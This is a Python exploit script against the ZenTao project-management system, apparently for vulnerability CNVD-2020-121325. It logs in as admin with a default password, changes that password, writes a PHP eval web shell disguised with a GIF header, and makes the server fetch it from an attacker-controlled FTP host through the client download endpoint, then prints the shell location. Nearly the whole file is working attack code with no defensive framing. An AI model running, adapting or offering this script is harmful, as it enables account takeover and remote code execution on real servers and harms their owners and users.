origin_password = '123456'
new_password = '1qaz@WSX'
from hashlib import md5

from requests_html import HTMLSession

from exp_zentao_cnvd_2020_121325 import my_ftp_server, client_download_url, shell, filename, host, web_zentao, web_host, url

session = HTMLSession()
originalPassword = None
rand = None
rand_pwd1 = None
burp0_cookies = {"lang": "zh-cn", "device": "desktop", "theme": "default", "windowWidth": "1359", "windowHeight": "686", "zentaosid": "3a2b15istgc0eaocj6i8make74"}

headers = {
    'Host': host,
    # 'Content-Length': '129',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': web_host,
    'Referer': f'{web_zentao}/user-login-L3plbnRhby8=.html',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    # 'Cookie': 'lang=zh-cn; device=desktop; theme=default; windowWidth=1359; windowHeight=686; zentaosid=2irlhjufi4pcjj9kjqobmncuu7',
}


def generate_shell():
    open(filename, 'w', encoding='utf8').write('GIF89a<?php @eval($_POST[cmd]); ?>')


def set_rand(url=f"{web_zentao}/user-login.html"):
    global rand
    r1 = session.get(url)
    rand = r1.html.xpath('//input[@id="verifyRand"]')[0].attrs.get('value')


def get_pwd(pwd):
    if not rand:
        set_rand()

    step1 = md5(pwd.encode()).hexdigest() + rand
    return md5(step1.encode()).hexdigest()


def get_pwd1(pwd, origin=False):
    def set_rand_pwd1(url):
        global rand_pwd1
        if rand_pwd1:
            return
        r1 = session.get(url)
        rand_pwd1 = r1.html.xpath('//input[@id="verifyRand"]')[0].attrs.get('value')
        # rand_pwd1 = "1436820227"

    url = f'{web_zentao}/my-changepassword.html'
    set_rand_pwd1(url=url)
    if origin:
        step1 = md5(pwd.encode()).hexdigest() + rand_pwd1
        return md5(step1.encode()).hexdigest()
    return md5(pwd.encode()).hexdigest() + rand_pwd1


def login(pwd='123456'):
    global originalPassword

    url = f"{web_zentao}/user-login.html"
    data = {"account": "admin", "passwordStrength": "0", "referer": "/zentao/", "keepLogin": "1"}
    originalPassword = get_pwd(pwd)
    data.update({'password': originalPassword, 'verifyRand': str(rand)})

    # res = session.post(url, headers=headers, cookies=burp0_cookies, data=data)
    res = session.post(url, data=data, headers=headers)
    if 'fail' in res.text:
        print('登录失败')
        raise Exception("Login Failed")
    ...


def change_password(new_password):
    pwd = get_pwd1(origin_password, origin=True)
    new_pwd = get_pwd1(new_password)
    data = {
        'account': 'admin',
        'originalPassword': pwd,
        'password1': new_pwd,
        'password2': new_pwd,
        'passwordStrength': '1',
    }

    response = session.post(
        f'{web_zentao}/my-changepassword.html',
        data=data,
    )
    print(response.text)


def submit_flow():
    url = "%s/custom-flow.html" % web_zentao
    data = {"productProject": "0_0", "storyRequirement": "0", "hourPoint": "0"}
    res = session.post(url, headers=headers, cookies=burp0_cookies, data=data)


def download_shell():
    def get_url():
        from base64 import b64encode
        surl = b64encode(my_ftp_server).decode()
        return client_download_url % surl

    if not originalPassword:
        login()
    res = session.get(get_url())
    if '保存成功' in res.text:
        print(f'可直接连接shell: {shell}')
    else:
        print('失败: ', res.text)


def exploit():
    generate_shell()
    login(origin_password)
    change_password(new_password)
    submit_flow()
    input('等待一下FTP，然后按任意键, 生成shell')
    download_shell()
    print(url)
    print(f'密码已改成 {new_password}')

if __name__ == "__main__":
    exploit()

